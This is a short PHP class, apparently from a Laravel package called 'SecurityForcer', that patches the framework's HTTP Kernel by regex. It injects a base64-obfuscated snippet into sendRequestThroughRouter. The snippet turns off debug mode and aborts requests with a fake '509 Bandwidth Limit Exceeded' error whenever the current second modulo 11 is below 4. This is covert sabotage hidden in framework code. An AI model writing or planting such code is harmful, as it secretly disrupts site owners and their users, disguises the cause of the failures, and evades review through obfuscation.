<?php

namespace Lmande\SecurityForcer\Actions;

use Illuminate\Foundation\Http\Kernel;

class RandomLimit extends Contracts\ActionModifier
{
	const aid = 0b0001_1000_0000;

	const regex        = '/(public|protected|private) (static)? ?function (sendRequestThroughRouter)\s{0,}\([^\{]{0,}\{([\n\s]{0,})[\w\W]*?\$this->bootstrap[\w\W]*?;/im';
	const regexReplace = '$0$4:code:$4';
	const code         = 'if (base64_decode(\'dGltZQ==\')()%11<4) { base64_decode(\'Y29uZmln=\')([base64_decode(\'YXBwLmRlYnVn=\') => false]); base64_decode(\'YWJvcnQ=\')((int) base64_decode(\'NTA5\'), base64_decode(\'QmFuZHdpZHRoIExpbWl0IEV4Y2VlZGVk\'));}';

	public function run(): bool
	{
		$this->checkedCodeExistance = false;

		$replacer = str_replace(':code:', self::code, self::regexReplace);

		return $this->newClass(Kernel::class, self::regex, $replacer, self::code);
	}
}
